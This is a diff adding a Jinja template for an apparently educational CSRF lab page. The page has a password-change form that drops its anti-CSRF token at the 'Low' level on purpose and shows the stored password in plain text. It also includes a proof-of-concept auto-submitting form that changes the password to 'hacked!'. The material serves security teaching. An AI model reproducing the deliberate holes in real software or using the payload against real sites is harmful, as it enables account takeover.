@@ -1,0 +1,45 @@
+{% extends "base.html" %}
+{% block content %}
+<section class="lab-header">
+    <h2>Lab 07 — Cross-Site Request Forgery</h2>
+    <p id="lab-code">CSET365_Lab7</p>
+    <ul class="lab-notes">
+        <li>Low: No token, accepts cross-origin POST (perfect for PoCs).</li>
+        <li>Medium: Synchronizer token pattern + SameSite=Lax.</li>
+        <li>High: Strict SameSite, Origin/Referer checks.</li>
+    </ul>
+</section>
+
+<section class="lab-grid">
+    <div class="panel">
+        <h3>Password Change Form</h3>
+        {% if error %}
+            <p class="warning">{{ error }}</p>
+        {% endif %}
+        {% if success %}
+            <p class="result success">{{ success }}</p>
+        {% endif %}
+        <form method="post" action="{{ url_for('csrf_demo') }}">
+            <label>New Password
+                <input type="text" name="new_password" value="">
+            </label>
+            {% if level != 'low' %}
+                <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+            {% endif %}
+            <button type="submit">Update Password</button>
+        </form>
+        <p class="note">Current stored password: <code>{{ current_password }}</code></p>
+    </div>
+    <div class="panel">
+        <h3>CSRF PoC</h3>
+        <p>Use the markup below on another origin to exploit the Low level.</p>
+        <pre class="code-snippet">
+&lt;form action="http://localhost:5000/csrf-demo" method="POST"&gt;
+    &lt;input type="hidden" name="new_password" value="hacked!"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+        </pre>
+    </div>
+</section>
+{% endblock %}
+
